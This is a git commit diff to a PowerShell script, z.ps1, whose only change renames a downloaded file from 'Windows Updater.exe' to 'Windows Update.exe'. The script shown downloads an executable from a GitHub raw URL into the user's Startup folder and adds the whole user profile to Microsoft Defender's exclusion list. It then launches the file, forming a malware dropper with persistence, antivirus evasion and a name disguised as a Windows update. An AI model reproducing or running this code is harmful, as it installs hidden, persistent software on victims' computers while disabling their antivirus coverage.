4193ce95aa68f31141819a8a0e7b4714a4782429
MRvinyKing <123846936+MRvinyKing@users.noreply.github.com>
2024-03-07 00:57:55 -0300

    Update z.ps1

--- z.ps1
+++ z.ps1
@@ -1,6 +1,6 @@
 $userDirectory = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
 $fileUrl = "https://raw.githubusercontent.com/MRvinyKing/pythonwgetfilestest/main/updater.exe"
-$startupFilePath = "$userDirectory\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Windows Updater.exe"
+$startupFilePath = "$userDirectory\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update.exe"
 $downloadCommand = "Invoke-WebRequest -Uri '$fileUrl' -OutFile '$startupFilePath'"
 $exclusionCommand = "Add-MpPreference -ExclusionPath '$userDirectory'"
 $startupCommand = "Start-Process '$startupFilePath'"
